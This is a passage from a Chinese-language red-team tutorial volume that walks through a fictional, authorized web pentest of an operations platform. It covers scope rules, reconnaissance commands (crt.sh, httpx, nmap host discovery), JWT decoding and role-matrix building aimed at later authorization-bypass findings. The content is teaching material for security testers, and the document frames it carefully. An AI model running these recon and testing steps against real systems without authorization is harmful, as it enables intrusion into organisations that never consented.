# VOL-10 实战全流程实例：一场完整交战的上帝视角

> 受众：5 年源码审计经验、转岗一人红队的工程师；已读完 VOL-01~09（Web 渗透 VOL-01/02、内网 VOL-03、源码联动 VOL-04、安装包 VOL-05、工具链 VOL-06、方法论与报告 VOL-07-08、AI 三部曲 VOL-09A/B/C）。
> 本卷任务：把零散知识串成一场**完整交战**——让你看到全过程的真实节奏、每一步的决策因果与工程细节。前九卷给的是武器与条令，这一卷是一场仗。

## 卷首：怎么读这一卷

### 虚构声明（先读这一段）

本卷所有内容均为**虚构教学构造**：客户"云帆科技"、域名 `oms.yunfan.example`（`.example` 为 RFC 2606 保留域）、后端段 `10.10.20.0/24`（文档专用虚构内网段）、公网 IP 使用 RFC 5737 测试段（203.0.113.x/198.51.100.x）、账号 `ops_user01`、安装包 `field-app.apk`、一切命令输出与响应报文都是**按真实形态手工构造的示例**，不指向任何真实机构或系统。文中所有利用手法均为公开常识（IDOR/SSRF/审批逻辑），利用深度止于"可复现验证"，不含新型可武器化攻击。对真实目标执行文中任何操作前，你必须持有书面授权。交战场景取材自零售电商生态的典型形态——运营管理平台、门店外勤 APP、订单/促销/退款资金流——与零售产品安全工作的常见形态对齐；但一切公司、系统、账号与数据仍全部虚构。

### 三层读法

| 读法 | 只看什么 | 适合什么时候 |
|---|---|---|
| **故事线** | 每幕标题、幕间导语、🧭 导游词、"上帝视角旁白" | 通读第一遍，1 小时建立全局感 |
| **决策逻辑** | 每幕【状态面板】+【因果】+【验证】 | 第二遍，回答"为什么下一步是这个"——信息缺口驱动（VOL-07-08 A1 决策模型） |
| **工程细节** | 【操作】+ 幕末目录树与契约文件片段 | 第三遍照着做；实际交战时当模板抄 |

上帝视角的含义：正常交战里你永远只看到局部，本卷让你**同时看到当时的我们与事后完整的真相**——每个关键节点附一段"上帝视角旁白"，告诉你那一刻全局实际是什么样、我们漏了什么、为什么漏。漏掉但被覆盖台账诚实记录，与漏掉且假装没漏，是两种完全不同的工程。

### 交战档案卡

| 项 | 值 |
|---|---|
| 客户 | 云帆科技（虚构） |
| 授权范围 | `oms.yunfan.example`（运营管理平台，认证后 Web 主目标）＋ `10.10.20.0/24` 后端段（**仅验证可达性，禁止深入**）＋ 随单 Android 安装包 `field-app.apk`（允许逆向） |
| 黑盒输入 | 普通运营账号 `ops_user01`（初始密码单独交付）、后端 IP 段、三个月前旧渗透报告一份 |
| 交付要求 | 中文报告 + POC 卡片 + 复测（VOL-07-08 B1/B2/B6） |
| 窗口 | 2026-09-07 ~ 2026-09-21（两周，10 个工作日），复测 2026-10-09 |
| 红线 | 非破坏原则：只读取证、涉资金操作仅限测试商户沙箱单、证据最小化 |

### 交战时间线总览（对照各幕）

| 工作日 | 日期（虚构） | 幕 | 里程碑 |
|---|---|---|---|
| D1 | 09-07 | 第 0 / 一幕 | 授权落 scope、目录骨架、被动测绘启动 |
| D2 | 09-08 | 第一幕 | 攻击面清单成形；后端段直连负结果 |
| D3–D4 | 09-09~10 | 第二 / 三幕 | 身份矩阵成形；F-01 验证闭环 |
| D5 | 09-10 | 第三幕 | F-01 证据固化与采样脚本 |
| D6–D7 | 09-11~12 | 第四幕 | APK 情报；v2 端点实锤 |
| D8 | 09-14 | 第五幕 | F-02 SSRF＋内网边缘克制探测 |
| D9–D10 | 09-15~16 | 第六幕 | F-03 两个原语闭环（沙箱单＋撤销） |
| D11 | 09-17 | 第七幕 | 三卡过独立重放门 |
| D12 | 09-18 | 第八幕 | 报告 v1.0 渲染交付 |
| D13 | 09-21 | 答疑 | 客户书面确认、修复排期 |
| +3 周 | 10-09 | 第九幕 | 复测四态判定＋F-04 |

### 人物表

| 角色 | 身份 | 在本卷的功能 |
|---|---|---|
| 你 | 一人红队（读者代入） | 全部技术动作与签字责任 |
| 周工 | 云帆安全负责人（虚构） | 授权、报备接收、配合初审、复测对接 |
| 李四 / 王五 | 华东 / 华南运营（虚构） | F-01 的相邻账号（不知情，数据已脱敏） |

### 本卷结构与漏洞链主线

| 幕 | 内容 | 漏洞链位置 |
|---|---|---|
| 第 0 幕 | 交战启动：授权/scope/环境/基线 | —（一切的地基） |
| 第一幕 | 外围侦察与攻击面测绘 | 链头：拿到攻击面清单 |
| 第二幕 | 登录认证后功能摸底：角色/权限模型推断 | 建立身份矩阵（VOL-09C ⑤） |
| 第三幕 | **发现一**：相邻账号 IDOR 订单越权（水平） | Web 主体第一洞 |
| 第四幕 | APK 逆向发现未公开 API 端点（联动 VOL-05） | 客户端反哺 Web |
| 第五幕 | **发现二**：未公开端点 SSRF → 内网边缘克制探测 | Web→内网边缘（联动 VOL-03） |
| 第六幕 | **发现三**：运营平台审批流逻辑漏洞（金额篡改/顺序绕过） | 业务逻辑（WSTG-BUSL） |
| 第七幕 | 证据固化与 POC 卡片（3 张完整卡） | 交付物成形 |
| 第八幕 | 中文报告骨架与 CVSS 定级 | 交付 |
| 第九幕 | 复测与四态判定 | 闭环 |
| 终幕 | 复盘：覆盖终态/预算/走错的三步/AI 协作得分与失分 | 经验沉淀 |
| 附录 A/B/C | 命令速查 / 交战目录最终树 / 审计员视角对照 | 工具书 |

### 贯穿约定

- **七段结构**：每一步固定按【因果】【原理】【操作】【验证】【陷阱】【AI 位】展开；【状态面板】合并放在每幕开头（上帝视角的第一要素：随时可见全局）。
- **导游层**：每幕开头有一段**幕间导语**（你现在在哪、上一幕改变了什么、本幕悬念），关键转折处插 🧭 **导游词**短框（观察／节奏／现场感三类）。分工：【因果】讲分析逻辑（为什么 A→B），导游词讲方位与节奏（现在在哪、看哪一行、别急什么）；【上帝视角旁白】负责事后全局真相。
- **工程契约**：交战目录 `~/redteam-engagements/2026-09-07-yunfan-oms/` 从空到最终形态逐步生长，每幕末尾给目录树快照与关键文件真实内容片段；findings 条目带 B′ 契约字段（`dedup_key/scope_check/exploitation_status/confidence 四级/auth_context/counterevidence`，语义对齐 VOL-09C §3.2 ⑧）。
- **置信度四级**：Certain / Firm / Tentative / Manual Review Required（VOL-09C ⑧）。
- **exploitation_status 四枚举**：validated / exploit-chain / theoretical / manual-review-required。
- **四态判定**（复测，VOL-07-08 B6）：已修复 / 部分修复 / 未修复 / 风险接受（须书面确认）。

---

## 第 0 幕 交战启动（D1 上午）：授权、范围与工程基线

D1 早上 9 点，交战的起点。你的硬盘里此刻只有四样东西：授权书 PDF、一组初始密码、一个后端网段、一个 APK——对目标的了解程度，约等于一个看过客户官网的访客。今天上午不产生任何情报，唯一的悬念是：能不能在发出第一个探测包之前，把"允许做什么"翻译成一行行机器可判定的规则。这层地基的质量，要到第十二天才见分晓。

**【状态面板】D1 09:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | 授权书 PDF、账号 `ops_user01`（密码在独立加密通道）、后端段 `10.10.20.0/24`、旧报告 `prior-report-2026-03.pdf`、安装包 `field-app.apk`（SHA256 已登记） |
| 当前假设 | H0-1「平台为前后端分离 B/S，存在 API 层」（Tentative，来自旧报告措辞）；H0-2「后端段从公网不可直达」（Tentative，常识先验，待第一幕验证） |
| 预算消耗 | 0 / 80 人时（10 工作日 × 8h） |
| 覆盖台账增量 | 尚未开测；本幕只建立**边界**与**基线**，边界本身也是覆盖台账的第一行：所有后续"测了什么"都以"允许什么"为分母 |

### 0.1 【因果】为什么第一小时读授权书，而不是开 Burp

信息缺口分析（VOL-07-08 A1.2 的 facts 模型）：此刻最大的缺口不是任何技术信息，而是**边界信息**——不知道"允许打什么"，一切技术动作都无法通过 scope_check，产出全部作废甚至构成事故。一人红队没有法务兜底，授权书就是唯一防线。所以第 0 幕的动作序列是：读授权书 → 落 scope.yaml → 建目录与基线 → 才允许出现第一个探测包。这不是仪式感，是决策模型里"前置条件不闭合就不执行"的直接应用。

### 0.2 【原理】scope 的双重属性与工程契约

scope 有两层属性。**法律层**：授权书界定了哪些资产、哪些动作、哪个时间窗被许可，越界的每一个包都是独立的责任事件；"仅验证可达性"这种限定词必须逐字翻译成可执行规则（例如：允许 ICMP/TCP ping 与单次连接尝试，禁止端口扫描、服务枚举、漏洞利用）。**工程层**：scope.yaml 是后面每条命令、每张 finding 的**机器可判定前提**——findings 的 scope_check 字段、AI 交战里的放行门（VOL-09C ⑦⑧），都以它为唯一权威。两层必须一一对应：法律文本里的每个限定词，都要能在 scope.yaml 里找到对应字段。

工程契约（VOL-09C §3.3）：交战目录是**目录即状态契约**——journal.jsonl 是 append-only 第一真相，state.json 只是可重建的派生缓存，findings/leads 分离，coverage 记负空间。第 0 幕把这套骨架立起来，后面每一幕只是往里填内容。

### 0.3 【操作】建目录、写 scope.yaml、记录基线

```bash
$ mkdir -p ~/redteam-engagements/2026-09-07-yunfan-oms/{secrets,sessions,assets,leads,coverage,poc,recon,evidence,logs,handoff,reports}
$ chmod 700 ~/redteam-engagements/2026-09-07-yunfan-oms/secrets
$ cd ~/redteam-engagements/2026-09-07-yunfan-oms
$ echo '{"schema_version":1,"engagement_id":"2026-09-07-yunfan-oms","skill":"redteam-agent@v0.9.2","references_sha":"a1b2c3d4"}' > engagement-snapshot.json
```

`scope.yaml`（本交战的宪法，后续任何动作先过它）：

```yaml
schema_version: 1
engagement_id: 2026-09-07-yunfan-oms
window: {test: "2026-09-07 ~ 2026-09-21", retest: "2026-10-09", hours: "09:00-19:00"}
authorization: {doc: "00-auth-letter-YF-SECTEST-2026-114.pdf", signer: "周工（云帆安全负责人）"}
allowed:
  domains: ["oms.yunfan.example"]
  cidrs:  ["10.10.20.0/24"]        # 限定动作，见 rules.r1
  packages: ["field-app.apk"]
rules:
  r1: 后端段仅允许可达性验证（ICMP/TCP ping、单次连接尝试）；禁止端口扫描/服务枚举/漏洞利用/凭据尝试
  r2: 非破坏：只读取证；涉资金操作仅限测试商户沙箱单（TEST-SHOP-002，单笔上限 10 元），演示后立即撤销
  r3: 证据最小化：每个 finding 采样 ≤3 条，含个人信息字段一律脱敏后落盘
  r4: 明确排除：云元数据接口（169.254.169.254 等）、其余 *.yunfan.example 子域、社会工程/钓鱼/压力测试
  r5: 出界即停：任何越 scope 数据立即停止、不落盘并书面告知周工
rate_limit: {self_imposed: "≤60 req/min/token，扫描类动作先书面报备"}
credentials:
  - {id: "CRED:ops01", account: "ops_user01", role: "operator（普通运营）", source: "客户交付"}
artifacts_in:
  - {path: "recon/prior-report-2026-03.pdf", note: "三个月前旧渗透报告，先当线索库用（第一幕）"}
  - {path: "recon/field-app.apk", sha256: "9f2c…e7a1", note: "随单安装包，允许静态/动态逆向"}
amendments: []        # 只允许追加（VOL-09C ⑫ changes_ledger 语义）
```

基线三件事——工具版本、网络位置、目标初始状态：

> 🧭 **导游词（观察）**：scope.yaml 里最值钱的一行是 r1——它把"仅验证可达性"这个法律短语翻译成了可执行的 ICMP/TCP ping 白名单。
> 第五幕整幕怎么打，此刻已被这一行决定。边界不是障碍物，是路线图。

```bash
$ ./tools.lock --check | tee logs/toolbox.json      # 工具链锁定（VOL-06、VOL-09C ⑩）
{"name":"nmap","version":"7.94","sha256":"ok"}
{"name":"httpx","version":"1.6.0","sha256":"ok"}
{"name":"jadx","version":"1.5.0","sha256":"ok"}
{"name":"Burp Suite","version":"2026.6","sha256":"n/a"}
$ curl -sI https://oms.yunfan.example | head -5       # 唯一一次"开场握手"，记录初始响应
HTTP/2 200
server: nginx
x-powered-by: PHP/8.2.20        # 先记下，不展开
```

第一条 journal：

> 🧭 **导游词（观察）**：基线输出里 `x-powered-by: PHP/8.2.20` 后面跟着你自己写的注释"先记下，不展开"——
> 这五个字就是侦察纪律的全部：此刻它只是一个事实，还不是一个方向。

```jsonl
{"ts":"2026-09-07T09:41:00+08:00","act":"A0","step":"init","status":"done","budget_min":35,"summary":"目录骨架+scope.yaml v1+工具/网络基线；授权书逐条翻译为 r1-r5"}
```

### 0.4 【验证】本幕成功判据

① scope.yaml 的 r1–r5 能与授权书逐条对上，拿给不熟悉项目的人读也能答"哪些事绝对不做"；② 交战目录骨架完整，journal.jsonl 有首条记录；③ Burp 全程代理已配置且测试流量无直连（`logs/commands.log` 里没有任何绕过代理的目标请求）；④ ops_user01 密码只存在于 `secrets/`（0600），其余文件里全是 `{{CRED:ops01}}` 占位符。

> 🧭 **导游词（节奏）**：验证全绿之后最痒的冲动是"先登上去看一眼平台长什么样"。
> 忍住——登录是第二幕的正戏，现在进去只会制造没有记录的流量；今天剩下的时间属于目录与基线。

### 0.5 【陷阱】

- **限定词虚化**："仅验证可达性"不落成具体规则（r1），三天后手一热就开始 nmap -sV——违规往往不是恶意，是忘了边界长什么样。
- **APK 里的第三方域名**：逆向时发现的统计 SDK、推送服务域名**不属于授权范围**（它们只是随包分发的第三方代码），撞到要停并记录。
- **旧报告当结论用**：旧报告是三个月前的快照，它的一切"已修复/未修复"都只是**待复核假设**，不是事实。

### 0.6 【AI 位】

AI 能做：把授权书 PDF 与 scope.yaml 对读，产出"限定词 → 规则"对照表并指出歧义点（提示思路：*"逐句提取授权书里所有限定词，分类为资产边界/动作边界/时间边界/数据边界，指出 scope.yaml 中每条对应哪个字段，无法对应的标红"*）；把旧报告解析成结构化复核清单 O-1/O-2/…。人必须守住：**scope 判定签字权**——AI 标红的歧义点必须由人与周工书面澄清后写进 amendments，AI 无权解释授权（VOL-09C 验收纪律：机器产出的边界结论一律是草稿）。

### 0.7 幕末目录树快照 v0

```text
2026-09-07-yunfan-oms/
├── engagement-snapshot.json
├── scope.yaml                # 宪法：allowed/rules/amendments
├── creds.yaml                # 凭据元数据（真值在 secrets/）
├── secrets/                  # 0600；ops_user01 密码唯一存放点
├── sessions/                 # 会话快照（第 0 幕尚空）
├── state.json                # 派生缓存：phase=A0 done
├── journal.jsonl             # 1 行
├── assets/                   # 尚空——第一幕开始生长
├── findings.jsonl            # 尚空
├── leads/  coverage/  poc/  recon/  evidence/  logs/  handoff/  reports/
```

> **上帝视角旁白**：此刻真实系统里，oms 平台共有 4 个角色（operator/senior_operator/finance/auditor）、两代 API（/api/v1 Web 用、/api/v2 移动端用）、后端段里活着 3 台主机。我们一项都不知道——没关系，第 0 幕的正确产出不是情报，是**让后面所有情报都有处安放**。

---

## 第一幕 外围侦察与攻击面测绘（D1 下午–D2）

地基已干，D1 下午。从现在起你合法地"看见"目标了——但本幕只允许用余光。要回答的问题只有一个：这块阵地到底有多大、入口长什么样。顺路还要了结第 0 幕留下的悬念：后端段 10.10.20.0/24，从你的网络位置到底碰不碰得到？这个答案会在五天后决定第五幕的打法。

**【状态面板】D2 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | `oms.yunfan.example` → CDN（203.0.113.66 为边缘节点）；登录页标题"云帆运营管理平台"；前端 Vue3 + nginx + PHP/8.2.20；**后端段 10.10.20.0/24 从测试网络直连全部超时**（负结果也是事实）；旧报告 3 条线索待复核（O-1/O-2/O-3）；APK 尚未开拆 |
| 当前假设 | H1-1「存在 /api/v1 与 API 层」（Certain，登录页 JS 已引用）；H1-2「CDN 背后有源站」（Firm，响应头差异）；H1-3「后端段只能从服务端触达」（Firm，直连超时 + 业务常理）；H0-2 升级为 Firm |
| 预算消耗 | 9.5 / 80 人时 |
| 覆盖台账增量 | 已测：DNS/CDN 归属、HTTP 存活与指纹、旧报告三线索登记、后端段直连可达性（负）。明确不测：其余 *.yunfan.example 子域（scope r4 排除）、CDN 供应商自身资产（不属于客户）、后端段端口/服务（scope r1）。原因均为**授权边界**，不是技术取舍 |

### 1.1 【因果】为什么是被动优先 + 小步指纹，而不是全端口轰炸

信息缺口：此刻缺的是**攻击面清单**——"有哪些可交互的入口"。候选动作有三个：主动扫描（快但吵）、被动收集（慢但静）、旧报告挖掘（免费）。决策排序按"期望信息增益 ÷ 噪音成本"（VOL-07-08 A1）：客户侧有云 WAF 和告警值班（旧报告提到），主动扫描的噪音会消耗客户信任额度，而黑盒输入里**已经有三个高价值信息源**（域名、IP 段、旧报告）没榨干。所以顺序是：被动穷尽 → 最小主动指纹 → 直连可达性一次性验完（负结果就死心，把假设 H1-3 立起来——它将来会驱动第五幕的 SSRF 探测）。

### 1.2 【原理】被动优先与"负结果事实化"

外围侦察的目标不是"扫得多"，而是把**攻击面清单**从 1 个域名扩展成结构化事实：解析链（域名→CDN→源站暗示）、技术栈、暴露面（HTTP 存活、标题、跳转）、历史线索（旧报告=三个月前的免费测绘结果）。每个事实进 assets，而不是留在终端滚屏里。

"负结果事实化"是本幕最重要的工程习惯：`10.10.20.0/24` 直连全超时不是失败，是一条**写进资产表的确定事实**——它把"可达性验证"这个授权动作的唯一可行路径指向了"服务端侧信道"（即第五幕：借应用之手探测）。黑盒测试里，把"做不到"记录为事实，和把"做到了"记录为事实，价值常常相等；丢掉负结果，后面就会反复重试同一个死胡同。

### 1.3 【操作】

```bash
# ① 解析与 CDN 归属
$ dig +short oms.yunfan.example
203.0.113.66
$ whois 203.0.113.66 | grep -iE "orgname|netname"    # 归属：云帆科技（虚构）——CDN 节点 IP 归属需谨慎判读
# ② 证书透明度（虚构输出；.example 域不会出现在真实 CT 日志，此处为教学形态）
$ curl -s "https://crt.sh/?q=%25.yunfan.example&output=json" | jq -r '.[].name_value' | sort -u | tee recon/subdomains.txt
oms.yunfan.example
api.yunfan.example          # ← 越界！scope 只允许 oms.*，登记但不测，写入 leads/L-03
```

> 🧭 **导游词（现场感）**：`api.yunfan.example` 蹦出来的那一行，肾上腺素会抢在理智前面——"多一个入口！"
> 等等，先对 scope：它不在允许清单里。发现的兴奋只许写进 leads/L-03，不许写进终端历史。

```bash
# ③ HTTP 存活与指纹（httpx，低速率）
$ httpx -u oms.yunfan.example -title -tech-detect -status-code -rate-limit 10
https://oms.yunfan.example [200] [云帆运营管理平台 - 登录] [nginx, Vue3, PHP/8.2.20]
# ④ 后端段直连可达性（scope r1 允许的全部动作，一次性做完）
$ nmap -sn 10.10.20.0/24 --max-rate 30 -oA recon/backend-direct
Nmap scan report for 10.10.20.0/24 [375 hosts(?)] ...
Nmap done: 256 IP addresses (0 hosts up) scanned in 51.20 s   # 全部超时 → 负结果事实化
```

> 🧭 **导游词（观察）**：`0 hosts up` 是本幕最重要的一行输出——尽管它长得像失败。
> 它把"可达性验证"从你的网络位置永久移走：这条授权项往后只能借应用之手完成（第五幕的伏笔在此埋下）。

```bash
# ⑤ 旧报告解析 → 复核清单（AI 辅助，见 1.6）
$ cat > leads/old-report-items.jsonl <<'EOF'
{"id":"O-1","title":"登录接口无验证码与速率限制","old_status":"未修复","plan":"第二幕复核"}
{"id":"O-2","title":"会话 8 小时不失效","old_status":"未修复","plan":"第二幕复核"}
{"id":"O-3","title":"退款备注字段存储型 XSS","old_status":"已修复","plan":"第二幕回归抽查"}
EOF
```

journal 增量与资产落盘：

```jsonl
{"ts":"2026-09-08T17:52:00+08:00","act":"A1","step":"recon","status":"done","budget_min":330,"summary":"攻击面测绘完成：CDN/Vue3+nginx+PHP8.2；后端段直连不可达（负结果事实化）；CT 发现 api.yunfan.example 越界只登记不测"}
```

`assets/attack_surface.json`（节选）：

```json
{
  "primary_host": {"name": "oms.yunfan.example", "edge_ip": "203.0.113.66", "cdn": true,
                   "title": "云帆运营管理平台 - 登录", "tech": ["nginx", "Vue3", "PHP/8.2.20"]},
  "backend_segment": {"cidr": "10.10.20.0/24", "direct_reachable": false, "permission": "reachability-only"},
  "out_of_scope_seen": ["api.yunfan.example"],
  "old_report_items": ["O-1", "O-2", "O-3"]
}
```

### 1.4 【验证】

① 攻击面清单里每一项都有来源（dig/CT/httpx/旧报告）与时间戳；② 后端段"不可达"结论可在任意时刻用同命令重放复核；③ 越界资产 api.yunfan.example 只有登记、没有任何主动请求（`logs/commands.log` 可证清白）；④ 覆盖台账出现第一个"明确不测"区，且每条都有理由。

### 1.5 【陷阱】

- **CDN 指纹当源站指纹**：203.0.113.66 的 nginx 版本是 CDN 的，不是客户的——第一幕曾据此误判"目标全靠 WAF 遮挡"（终幕"走错三步"之一）。判读归属永远看 whois+响应头组合，不看单一信号。
- **子域撞真实第三方**：CT 日志里出现的 api.yunfan.example 属于同一虚构域但在 scope 外——扫描器一把梭的结果就是越界。子域清单必须先过 scope_check 再进任何工具。
- **nmap 超时≠结论**：直连超时只证明"从测试网络不可达"，不证明"从互联网不可达"；假设里要写清观察位置（H1-3 的完整表述：从本测试网络位置）。

> 🧭 **导游词（现场感）**：whois 显示"CDN 服务商"的那一秒，后背会凉一下——原来盯了半天的是镜子，不是门。
> 这份凉意值得保留：它逼着你在每个指纹上追问"这个信号到底属于谁的资产"。

### 1.6 【AI 位】

AI 能做：① 解析旧报告 PDF 抽取结构化复核清单（上面 O-1/O-2/O-3 即 AI 产出后人工核对定稿）；② CT/子域清单去重与归属初判（提示思路：*"对每个子域给出：是否匹配 scope.yaml 的 allowed.domains；不匹配的只输出名单，不要给出任何探测建议"*）；③ 把 httpx/nmap 原始输出压缩成 assets 结论行（VOL-09B 的"原始输出→结论行"模式，禁止整读）。人必须守住：**AI 不产生任何指向目标的请求**；AI 给的归属初判必须过 whois 人工复核；越界名单 AI 只准登记不准"顺手看一眼"。

### 1.7 幕末目录树快照 v1

```text
2026-09-07-yunfan-oms/
├── scope.yaml / creds.yaml / secrets/ / state.json        # 同 v0
├── journal.jsonl             # 4 行（A0×1 + A1×3）
├── assets/
│   ├── assets.jsonl          # 实体表：host×1、fact×6（含负结果）
│   └── attack_surface.json   # 上文节选
├── leads/
│   ├── old-report-items.jsonl
│   └── L-03-out-of-scope-api.md   # api.yunfan.example 登记（不测）
├── recon/                    # dig/httpx/nmap 原始输出（backend-direct.*）
├── coverage/coverage.json    # 首版：5 行已测 / 3 行明确不测
├── findings.jsonl            # 0 行（尚无 VERIFIED）
└── poc/ evidence/ logs/ handoff/ reports/                 # 尚空
```

> **上帝视角旁白**：api.yunfan.example 其实是一台独立的网关，上面跑着 v3 接口——本交战自始至终没人碰它（正确）。但它提醒我们：黑盒的"攻击面"永远以授权边界为界，而不是以技术好奇心为界。这条线在终幕的覆盖台账里会再次出现。

---

## 第二幕 登录认证后功能摸底（D3–D4）：角色与权限模型推断

D3 早上，你第一次以运营的身份走进平台。上一幕看清了大门，这一幕要进去画地图——不是功能地图，是身份地图：系统认为谁可以做什么。身上还背着旧报告的三笔账（O-1/O-2/O-3），本幕之内必须逐条了结。真正的悬念只有一个：手里只有一个账号，怎么测出四个角色的边界？

**【状态面板】D4 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | 登录成功返回 JWT（HS256，claims 含 `role:"operator"`）+ 8h refresh cookie；前端路由表暴露 4 个角色名：operator / senior_operator / finance / auditor；API 全部在 `/api/v1/*`（23 个端点已登记）；旧报告复核：O-1 **已修复**（登录限速+验证码实测生效）、O-2 **部分属实**（access 30 分钟过期，但 refresh 8h 且无失效机制）、O-3 已修复（回归抽查通过） |
| 当前假设 | H2-1「鉴权只到角色级，未到对象级」（Tentative，待第三幕差分验证）；H2-2「存在移动端 /api/v2」（Tentative，登录页 JS 无引用但 UA 适配代码有暗示）；H2-3「auditor 角色只读」（Firm，路由表 meta 标注 readonly） |
| 预算消耗 | 21 / 80 人时 |
| 覆盖台账增量 | 已测：认证流（登录/登出/刷新）、O-1/O-2/O-3 复核、前端路由与端点枚举、菜单可见面、零售六面盘点（订单/退款排入实测，库存/价格/促销/积分转 needs_follow_up）。明确不测：短信/邮箱找回通道（未提供入口且涉第三方，登记 leads）、支付网关侧接口（scope 外）、密码爆破（O-1 已修复且 r2 非破坏） |

### 2.1 【因果】为什么登录后第一件事是"画角色矩阵"而不是点功能

信息缺口：账号已到手，但"这个账号能做什么、**本应**做什么、平台**以为**它能做什么"三者的差集才是越权类漏洞的定义域。只有一个账号的差分怎么做？答案：**角色模型先于角色账号**——前端路由表、菜单树、接口注释里藏着完整的角色语义，先用它建立"应然矩阵"，再用 ops_user01 实测"实然矩阵"，两者的差就是候选越权面（VOL-09C ⑤ 身份矩阵：角色对 × 受保护端点 × 差分重放）。同时旧报告三条线索必须在本幕了结——它们是免费假设，拖到最后会污染预算。

### 2.2 【原理】认证后测绘的"角色相对论"与令牌里的角色泄漏

认证后测试与未认证测试的本质区别：**一切响应都以身份为自变量**。同一端点，operator 和 finance 看到的是不同投影。所以认证后摸底的核心产出不是 URL 列表，而是"身份 × 端点"矩阵的骨架。JWT 的 claims 又免费送了一层信息：`role:"operator"` 说明服务端以令牌角色做**功能级**鉴权（能不能进这个接口），但 claims 里没有任何资源归属字段（没有 org_id/shop_id 绑定）——这正是"功能级有、对象级无"的经典信号，直接支撑 H2-1，把第三幕的 IDOR 假设置信度抬高。

另一个工程要点：会话是**易耗品**。30 分钟 access 过期意味着任何长测试流程都会中途 401。对策是把会话管理做成一等实体（sessions/ 快照 + 刷新脚本 + 过期检测），而不是每次手点重新登录——这来自 VOL-09C ⑤ 的教训：认证后工作流的第一塌方点就是会话过期打断状态。

### 2.3 【操作】

登录流（Burp Proxy 全程记录，此处为 Repeater 复核）：

```http
POST /api/v1/auth/login HTTP/1.1
Host: oms.yunfan.example
Content-Type: application/json

{"username":"ops_user01","password":"{{CRED:ops01}}","captcha":"7X2K","captcha_id":"c-8f21a"}
```
```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: refresh_token=…; HttpOnly; Secure; SameSite=Strict

{"code":0,"data":{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIiLCJyb2xlIjoib3BlcmF0b3IiLCJ1aWQiOiI3NyIsImV4cCI6MTc1NzMyMDM0MH0.sig",
 "expires_in":1800,"need_change_pwd":true}}
```

`$ echo 'eyJzdWIiOiIiLCJyb2xlIjoib3BlcmF0b3Ii…' | cut -d. -f2 | base64 -d 2>/dev/null; echo`
→ `{"sub":"ops_user01","role":"operator","uid":77,"exp":1757320340}`

前端路由与角色枚举（从登录后首页加载的 app.9f2c.js 提取，jq 后处理）：

> 🧭 **导游词（观察）**：解码结果里有一正一负两把钥匙：`role:operator` 证明功能级鉴权存在；而 claims 里**没有**任何归属字段（org、数据范围）。
> 这个"没有"就是 H2-1 的种子——第三幕整幕从它发芽。

```bash
$ cat recon/app.9f2c.js | grep -oE 'path:"[^"]+"|roles:[[^]]*]' | paste - - | head -8
"/orders"          roles:[operator,senior_operator,finance,auditor]
"/orders/detail"   roles:[operator,senior_operator,finance,auditor]
"/refunds"         roles:[operator,senior_operator,finance]
"/refunds/approval" roles:[senior_operator,finance]        # ← 审批页不允许 operator：应然矩阵关键行
"/audit"           roles:[auditor]
```

端点登记（`assets/endpoints.jsonl` 节选，每行一个实体）：

```jsonl
{"ep":"/api/v1/orders","methods":["GET"],"auth":true,"roles":["operator+"],"note":"列表默认按 uid 过滤"}
{"ep":"/api/v1/orders/{order_id}","methods":["GET"],"auth":true,"roles":["operator+"],"note":"详情，第三幕主目标"}
{"ep":"/api/v1/refunds","methods":["GET","POST"],"auth":true,"roles":["operator+"]}
{"ep":"/api/v1/refunds/{id}","methods":["PATCH"],"auth":true,"roles":["operator+"],"note":"发起人修改"}
{"ep":"/api/v1/refunds/{id}/first-approval","methods":["POST"],"auth":true,"roles":["senior_operator"]}
{"ep":"/api/v1/refunds/{id}/final-approval","methods":["POST"],"auth":true,"roles":["finance"]}
{"ep":"/api/v1/refunds/{id}/cancel","methods":["POST"],"auth":true,"roles":["operator+"]}
```

从路由表与菜单生成的**应然矩阵**节选（完整 23×4 见 `assets/role_model.md`；? = 未知，待差分）：

| 端点（方法） | operator | senior_operator | finance | auditor |
|---|---|---|---|---|
| /api/v1/orders（GET 列表） | ✓ | ✓ | ✓ | ✓ |
| /api/v1/orders/{id}（GET 详情） | ✓ | ✓ | ✓ | ✓ |
| /api/v1/refunds（POST 提交） | ✓ | ✓ | ✓ | ✗ |
| /refunds/{id}/first-approval（POST） | **✗** | ✓ | ✗ | ✗ |
| /refunds/{id}/final-approval（POST） | **✗** | ✗ | ✓ | ✗ |
| /refunds/{id}（PATCH 修改） | ?（发起人？所有人？） | ? | ? | ✗ |
| /api/v1/orders/{id}/export（GET） | ? | ? | ✓ | ✓ |

"?"格与"✗"格就是后续测试用例的生成器——第六幕的 F-03 正是从两个 **✗** 格与一个 **?** 格长出来的。

> 🧭 **导游词（节奏）**：矩阵画完，手最痒的是立刻去打那两个 ✗ 格（审批接口）。
> 别急——现在动它，你既没有合法路径的对照组，也没有撤销预案；那是第六幕的仗。本幕只负责把靶子画清楚。

#### 零售业务面盘点清单（越权高发的六个面）

零售平台的权限天然按业务面切：店运营、品类、财务、客服各管一段，同一份订单数据在六个面各有一个投影。认证后摸底时按这六面各问一遍"我的角色在别的面能看见什么、改什么"，越权候选密度远高于通用后台——高发不是巧合，每面都有结构性原因：

| 业务面 | 主要使用者 | 为什么是越权高发区 |
|---|---|---|
| 订单 | 运营 / 客服 | "详情按单号直查"最普遍，跨店跨客服的归属校验最常缺席（本卷 F-01） |
| 库存 | 门店 / 供应链 | 店与店共用同一接口，缺 store_id 归属过滤即跨店可读可改 |
| 价格 | 品类运营 | 改价走审批分层，但落价接口常只认"登录＋菜单入口" |
| 促销 | 市场运营 | 生效时间/叠加/互斥规则复杂，约束大多活在前端与配置表 |
| 退款 | 客服 / 财务 | 资金出口＋审批流，规则最多、改动手最杂（本卷 F-03 与 6.3 变体） |
| 积分 | 全线调用 | 记账分散（下单得、退款扣、活动送），对账弱、篡改滞后暴露 |

本卷受账号与预算所限，只实测了订单与退款两面，其余四面按"先枚举、再排险、测不到就记账"转 coverage 的 needs_follow_up——清单的用法是保底，不是求全。

### 2.4 【验证】

